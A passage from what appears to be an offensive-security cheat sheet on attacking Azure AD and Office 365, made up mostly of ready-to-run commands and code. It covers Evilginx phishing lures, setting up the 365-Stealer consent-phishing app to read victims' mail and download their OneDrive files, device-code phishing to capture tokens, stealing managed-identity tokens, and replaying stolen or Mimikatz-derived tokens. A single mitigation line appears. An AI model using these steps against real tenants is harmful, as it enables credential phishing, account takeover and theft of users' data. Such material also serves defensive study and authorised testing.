class="n">key</span>
<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a><span class="p">:</span> <span class="n">phishlets</span> <span class="n">enable</span> <span class="n">o365</span>
<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>
<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a><span class="c"># get the phishing URL</span>
<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a><span class="p">:</span> <span class="n">lures</span> <span class="n">create</span> <span class="n">o365</span>
<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a><span class="p">:</span> <span class="n">lures</span> <span class="nb">get-url</span> <span class="n">0</span>
</code></pre></div>
<h2 id="illicit-consent-grant">Illicit Consent Grant</h2>
<blockquote>
<p>The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. </p>
</blockquote>
<p>Check if users are allowed to consent to apps: <code>PS AzureADPreview&gt; (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole</code>
* <strong>Disable user consent</strong> : Users cannot grant permissions to applications.
* <strong>Users can consent to apps from verified publishers or your organization, but only for permissions you select</strong> : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant
* <strong>Users can consent to all apps</strong> : allows all users to consent to any permission which doesn't require admin consent,
* <strong>Custom app consent policy</strong></p>
<h3 id="register-application">Register Application</h3>
<ol>
<li>Login to https://portal.azure.com &gt; Azure Active Directory</li>
<li>Click on <strong>App registrations</strong> &gt; <strong>New registration</strong></li>
<li>Enter the Name for our application</li>
<li>Under support account types select <strong>"Accounts in any organizational directory (Any Azure AD directory - Multitenant)"</strong></li>
<li>Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is <code>https://&lt;DOMAIN/IP&gt;:&lt;PORT&gt;/login/authorized</code>.</li>
<li>Click <strong>Register</strong> and save the <strong>Application ID</strong></li>
</ol>
<h3 id="configure-application">Configure Application</h3>
<ol>
<li>Click on <code>Certificates &amp; secrets</code></li>
<li>Click on <code>New client secret</code> then enter the <strong>Description</strong> and click on <strong>Add</strong>.</li>
<li>Save the <strong>secret</strong>'s value.</li>
<li>Click on API permissions &gt; Add a permission</li>
<li>Click on Microsoft Graph &gt; <strong>Delegated permissions</strong></li>
<li>Search and select the below mentioned permissions and click on Add permission<ul>
<li>Contacts.Read </li>
<li>Mail.Read / Mail.ReadWrite</li>
<li>Mail.Send</li>
<li>Notes.Read.All</li>
<li>Mailboxsettings.ReadWrite</li>
<li>Files.ReadWrite.All </li>
<li>User.ReadBasic.All</li>
<li>User.Read</li>
</ul>
</li>
</ol>
<h3 id="setup-365-stealer-deprecated">Setup 365-Stealer (Deprecated)</h3>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> Default port for 365-Stealer phishing is 443</p>
<ul>
<li>Run XAMPP and start Apache</li>
<li>Clone 365-Stealer into <code>C:\xampp\htdocs\</code><ul>
<li><code>git clone https://github.com/AlteredSecurity/365-Stealer.git</code></li>
</ul>
</li>
<li>Install the requirements<ul>
<li>Python3</li>
<li>PHP CLI or Xampp server</li>
<li><code>pip install -r requirements.txt</code></li>
</ul>
</li>
<li>Enable sqlite3 (Xampp &gt; Apache config &gt; php.ini) and restart Apache</li>
<li>Edit <code>C:/xampp/htdocs/yourvictims/index.php</code> if needed<ul>
<li>Disable IP whitelisting <code>$enableIpWhiteList = false;</code></li>
</ul>
</li>
<li>Go to 365-Stealer Management portal &gt; Configuration (http://localhost:82/365-stealer/yourVictims)<ul>
<li><strong>Client Id</strong> (Mandatory): This will be the Application(Client) Id of the application that we registered.</li>
<li><strong>Client Secret</strong> (Mandatory): Secret value from the Certificates &amp; secrets tab that we created.</li>
<li><strong>Redirect URL</strong> (Mandatory): Specify the redirect URL that we entered during registering the App like <code>https://&lt;Domain/IP&gt;/login/authorized</code> </li>
<li><strong>Macros Location</strong>: Path of macro file that we want to inject.</li>
<li><strong>Extension in OneDrive</strong>: We can provide file extensions that we want to download from the victims account or provide <code>*</code> to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. </li>
<li><strong>Delay</strong>: Delay the request by specifying time in seconds while stealing</li>
</ul>
</li>
<li>Create a Self Signed Certificate to use HTTPS</li>
<li>Run the application either click on the button or run this command : <code>python 365-Stealer.py --run-app</code><ul>
<li><code>--no-ssl</code>: disable HTTPS</li>
<li><code>--port</code>: change the default listening port</li>
<li><code>--token</code>: provide a specific token</li>
<li><code>--refresh-token XXX --client-id YYY --client-secret ZZZ</code>: use a refresh token</li>
</ul>
</li>
<li>Find the Phishing URL: go to <code>https://&lt;IP/Domain&gt;:&lt;Port&gt;</code> and click on <strong>Read More</strong> button or in the console.</li>
</ul>
<h3 id="setup-vajra">Setup Vajra</h3>
<blockquote>
<p>Vajra is a UI-based tool with multiple techniques for attacking and enumerating in the target's Azure environment. It features an intuitive web-based user interface built with the Python Flask module for a better user experience. The primary focus of this tool is to have different attacking techniques all at one place with web UI interfaces. - https://github.com/TROUBLE-1/Vajra</p>
</blockquote>
<p><strong>Mitigation</strong>: Enable <code>Do not allow user consent</code> for applications in the "Consent and permissions menu".</p>
<h2 id="device-code-phish">Device Code Phish</h2>
<p>Requirements:
* Azure AD / Office 365 E3 Subscription</p>
<p>Exploitation:</p>
<ul>
<li>Import TokenTactics: <code>PS C:\TokenTactics&gt; Import-Module .\TokenTactics.psd1</code></li>
<li>Request a device code for the Azure Graph API using TokenTactics: <code>Get-AzureToken -Client Graph</code></li>
<li>Replace <code>&lt;REPLACE-WITH-DEVCODE-FROM-TOKENTACTICS&gt;</code> in the <a href="https://github.com/rvrsh3ll/TokenTactics/blob/main/resources/DeviceCodePhishingEmailTemplate.oft">phishing email</a></li>
<li>Leave TokenTactics running in the PowerShell window and send the phishing email</li>
<li>Targeted user will follow the link to https://microsoft.com/devicelogin and complete the Device Code form</li>
<li>Enjoy your <strong>Access Token</strong> &amp; <strong>Refresh Token</strong></li>
</ul>
<h2 id="token-from-managed-identity">Token from Managed Identity</h2>
<blockquote>
<p><strong>MSI_ENDPOINT</strong> is an alias for <strong>IDENTITY_ENDPOINT</strong>, and <strong>MSI_SECRET</strong> is an alias for <strong>IDENTITY_HEADER</strong>.</p>
</blockquote>
<p>Find IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : <code>env</code></p>
<p>Most of the time, you want a token for one of these resources: 
* https://storage.azure.com
* https://vault.azure.net
* https://graph.microsoft.com
* https://management.azure.com</p>
<h3 id="azure-api-via-powershell">Azure API via Powershell</h3>
<p>Get <strong>access_token</strong> from <strong>IDENTITY_HEADER</strong> and <strong>IDENTITY_ENDPOINT</strong>: <code>system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&amp;api-version=2017-09-01" -H secret:$IDENTITY_HEADER');</code>. </p>
<p>Then query the Azure REST API to get the <strong>subscription ID</strong> and more .</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nv">$Token</span> <span class="p">=</span> <span class="s1">&#39;eyJ0eX..&#39;</span>
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nv">$URI</span> <span class="p">=</span> <span class="s1">&#39;https://management.azure.com/subscriptions?api-version=2020-01-01&#39;</span>
<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="c"># $URI = &#39;https://graph.microsoft.com/v1.0/applications&#39;</span>
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="nv">$RequestParams</span> <span class="p">=</span> <span class="p">@{</span>
<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a> <span class="n">Method</span> <span class="p">=</span> <span class="s1">&#39;GET&#39;</span>
<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a> <span class="n">Uri</span> <span class="p">=</span> <span class="nv">$URI</span>
<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a> <span class="n">Headers</span> <span class="p">=</span> <span class="p">@{</span>
<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a> <span class="s1">&#39;Authorization&#39;</span> <span class="p">=</span> <span class="s2">&quot;Bearer $Token&quot;</span>
<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a> <span class="p">}</span>
<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="p">}</span>
<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="p">(</span><span class="nb">Invoke-RestMethod</span> <span class="nv">@RequestParams</span><span class="p">).</span><span class="n">value</span> 
<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>
<a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="c"># List resources and check for runCommand privileges</span>
<a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="nv">$URI</span> <span class="p">=</span> <span class="s1">&#39;https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01&#39;</span>
<a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a><span class="nv">$URI</span> <span class="p">=</span> <span class="s1">&#39;https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/&lt;RG-NAME&gt;/providers/Microsoft.Compute/virtualMachines/&lt;RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01&#39;</span>
</code></pre></div>
<h3 id="azure-api-via-python-version">Azure API via Python Version</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">IDENTITY_ENDPOINT</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;IDENTITY_ENDPOINT&#39;</span><span class="p">]</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">IDENTITY_HEADER</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;IDENTITY_HEADER&#39;</span><span class="p">]</span>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Management API&quot;</span><span class="p">)</span>
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;curl &quot;</span><span class="si">%s</span><span class="s1">?resource=https://management.azure.com/&amp;api-version=2017-09-01&quot; -H secret:</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">IDENTITY_ENDPOINT</span><span class="p">,</span> <span class="n">IDENTITY_HEADER</span><span class="p">)</span>
<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="n">val</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Access Token: &quot;</span><span class="o">+</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">val</span><span class="p">)[</span><span class="s2">&quot;access_token&quot;</span><span class="p">])</span>
<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ClientID/AccountID: &quot;</span><span class="o">+</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">val</span><span class="p">)[</span><span class="s2">&quot;client_id&quot;</span><span class="p">])</span>
<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>
<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">[+] Graph API&quot;</span><span class="p">)</span>
<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;curl &quot;</span><span class="si">%s</span><span class="s1">?resource=https://graph.microsoft.com/&amp;api-version=2017-09-01&quot; -H secret:</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">IDENTITY_ENDPOINT</span><span class="p">,</span> <span class="n">IDENTITY_HEADER</span><span class="p">)</span>
<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="n">val</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">val</span><span class="p">)[</span><span class="s2">&quot;access_token&quot;</span><span class="p">])</span>
<a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ClientID/AccountID: &quot;</span><span class="o">+</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">val</span><span class="p">)[</span><span class="s2">&quot;client_id&quot;</span><span class="p">])</span>
</code></pre></div>
<p>or inside a Python Function:</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="kn">import</span> <span class="nn">logging</span><span class="o">,</span> <span class="nn">os</span>
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="kn">import</span> <span class="nn">azure.functions</span> <span class="k">as</span> <span class="nn">func</span>
<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">req</span><span class="p">:</span> <span class="n">func</span><span class="o">.</span><span class="n">HttpRequest</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">func</span><span class="o">.</span><span class="n">HttpResponse</span><span class="p">:</span>
<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Python HTTP trigger function processed a request.&#39;</span><span class="p">)</span>
<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>    <span class="n">IDENTITY_ENDPOINT</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;IDENTITY_ENDPOINT&#39;</span><span class="p">]</span>
<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>    <span class="n">IDENTITY_HEADER</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;IDENTITY_HEADER&#39;</span><span class="p">]</span>
<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>    <span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;curl &quot;</span><span class="si">%s</span><span class="s1">?resource=https://management.azure.com&amp;apiversion=2017-09-01&quot; -H secret:</span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">IDENTITY_ENDPOINT</span><span class="p">,</span> <span class="n">IDENTITY_HEADER</span><span class="p">)</span>
<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>    <span class="n">val</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>    <span class="k">return</span> <span class="n">func</span><span class="o">.</span><span class="n">HttpResponse</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">status_code</span><span class="o">=</span><span class="mi">200</span><span class="p">)</span>
</code></pre></div>
<h3 id="get-tokens">Get Tokens</h3>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> The lifetime of a Primary Refresh Token is 14 days!</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c"># az cli - get tokens </span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">az</span> <span class="n">account</span> <span class="nb">get-access</span><span class="n">-token</span> 
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="n">az</span> <span class="n">account</span> <span class="nb">get-access</span><span class="n">-token</span> <span class="p">-</span><span class="n">-resource-type</span> <span class="n">aad-graph</span>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c"># or Az</span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="p">(</span><span class="nb">Get-AzAccessToken</span> <span class="n">-ResourceUrl</span> <span class="n">https</span><span class="p">://</span><span class="n">graph</span><span class="p">.</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="p">).</span><span class="n">Token</span>
<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="c"># or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT</span>
</code></pre></div>
<h3 id="use-tokens">Use Tokens</h3>
<blockquote>
<p>Tokens contain all the claims including that for MFA and Conditional Access</p>
</blockquote>
<ul>
<li>Az Powershell
    <div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nv">$token</span> <span class="p">=</span> <span class="s1">&#39;eyJ0e..&#39;</span>
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Connect-AzAccount</span> <span class="n">-AccessToken</span> <span class="nv">$token</span> <span class="n">-AccountId</span> <span class="p">&lt;</span><span class="n">ACCOUNT-ID</span><span class="p">&gt;</span>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="c"># Access Token and Graph Token</span>
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nv">$token</span> <span class="p">=</span> <span class="s1">&#39;eyJ0eX..&#39;</span>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nv">$graphaccesstoken</span> <span class="p">=</span> <span class="s1">&#39;eyJ0eX..&#39;</span>
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Connect-AzAccount</span> <span class="n">-AccessToken</span> <span class="nv">$token</span> <span class="n">-GraphAccessToken</span> <span class="nv">$graphaccesstoken</span> <span class="n">-AccountId</span> <span class="p">&lt;</span><span class="n">ACCOUNT-ID</span><span class="p">&gt;</span>
<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">Get-AzResource</span>
<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="c"># ERROR: &#39;this.Client.SubscriptionId&#39; cannot be null.</span>
<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="c"># ---&gt; The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI</span>
</code></pre></div></li>
<li>AzureAD
    <div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">Import-Module</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">AzureAD</span><span class="p">\</span><span class="n">AzureAD</span><span class="p">.</span><span class="n">psd1</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="nv">$AADToken</span> <span class="p">=</span> <span class="s1">&#39;eyJ0…&#39;</span>
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="nb">Connect-AzureAD</span> <span class="n">-AadAccessToken</span> <span class="nv">$AADToken</span> <span class="n">-TenantId</span> <span class="p">&lt;</span><span class="n">TENANT-ID</span><span class="p">&gt;</span> <span class="n">-AccountId</span> <span class="p">&lt;</span><span class="n">ACCOUNT-ID</span><span class="p">&gt;</span>
</code></pre></div></li>
</ul>
<h3 id="refresh-tokens">Refresh Tokens</h3>
<ul>
<li>https://github.com/ConstantinT/Lantern
    <div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">Lantern</span><span class="p">.</span><span class="n">exe</span> <span class="n">cookie</span> <span class="p">-</span><span class="n">-derivedkey</span> <span class="p">&lt;</span><span class="n">Key</span> <span class="n">from</span> <span class="n">Mimikatz</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-context</span> <span class="p">&lt;</span><span class="n">Context</span> <span class="n">from</span> <span class="n">Mimikatz</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-prt</span> <span class="p">&lt;</span><span class="n">PRT</span> <span class="n">from</span> <span class="n">Mimikatz</span><span class="p">&gt;</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="n">Lantern</span><span class="p">.</span><span class="n">exe</span> <span class="n">mdm</span> <span class="p">-</span><span class="n">-joindevice</span> <span class="p">-</span><span class="n">-accesstoken</span> <span class="p">(</span><span class="n">or</span> <span class="n">some</span> <span class="n">combination</span> <span class="n">from</span> <span class="n">the</span> <span class="n">token</span> <span class="n">part</span><span class="p">)</span> <span class="p">-</span><span class="n">-devicename</span> <span class="p">&lt;</span><span class="n">Name</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-outpfxfile</span> <span class="p">&lt;</span><span class="n">Some</span> <span class="n">path</span><span class="p">&gt;</span>
<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="n">Lantern</span><span class="p">.</span><span class="n">exe</span> <span class="n">token</span> <span class="p">-</span><span class="n">-username</span> <span class="p">&lt;</span><span class="n">Username</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-password</span> <span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span>
<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="n">Lantern</span><span class="p">.</span><span class="n">exe</span> <span class="n">token</span> <span class="p">-</span><span class="n">-refreshtoken</span> <span class="p">&lt;</span><span class="n">RefreshToken</span><span class="p">&gt;</span>
<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="n">Lantern</span><span class="p">.</span><span class="n">exe</span> <span class="n">devicekeys</span> <span class="p">-</span><span class="n">-pfxpath</span> <span class="n">XXXX</span><span class="p">.</span><span class="n">pfx</span> <span class="p">-</span><span class="n">-refreshtoken</span> <span class="p">(-</span><span class="n">-prtcookie</span> <span class="p">/</span> <span class="p">--</span><span class="n">-username</span> <span class="p">+</span> <span class="p">-</span><span class="n">-password</span> <span class="p">)</span> 
</code></pre></div></li>
<li>https://github.com/rvrsh3ll/TokenTactics
    <div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">TokenTactics</span><span class="p">.</span><span class="n">psd1</span>
<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="n">CommandType</span>     <span class="n">Name</span>                                               <span class="n">Version</span>    <span class="n">Source</span>
<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="p">-----------</span>     <span class="p">----</span>                                               <span class="p">-------</span>    <span class="p">------</span>
<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="k">Function</span>        <span class="nb">Clear-Token</span>                                        <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="k">Function</span>        <span class="n">Dump-OWAMailboxViaMSGraphApi</span>                       <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="k">Function</span>        <span class="n">Forge-UserAgent</span>                                    <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="k">Function</span>        <span class="nb">Get-AzureToken</span>                                     <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="k">Function</span>        <span class="nb">Get-TenantID</span>                                       <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="k">Function</span>        <span class="nb">Open-OWAMailboxInBrowser</span>                           <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="k">Function</span>        <span class="n">Parse-JWTtoken</span>                                     <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a><span class="k">Function</span>        <span class="n">RefreshTo-AzureCoreManagementToken</span>                 <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a><span class="k">Function</span>        <span class="n">RefreshTo-AzureManagementToken</span>                     <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a><span class="k">Function</span>        <span class="n">RefreshTo-DODMSGraphToken</span>                          <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a><span class="k">Function</span>        <span class="n">RefreshTo-GraphToken</span>                               <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a><span class="k">Function</span>        <span class="n">RefreshTo-MAMToken</span>                                 <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-16" name="__codelineno-27-16" href="#__codelineno-27-16"></a><span class="k">Function</span>        <span class="n">RefreshTo-MSGraphToken</span>                             <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-17" name="__codelineno-27-17" href="#__codelineno-27-17"></a><span class="k">Function</span>        <span class="n">RefreshTo-MSManageToken</span>                            <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
<a id="__codelineno-27-18" name="__codelineno-27-18" href="#__codelineno-27-18"></a><span class="k">Function</span>        <span class="n">RefreshTo-MSTeamsToken</span>                             <span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span>      <span class="n">TokenTactics</span>
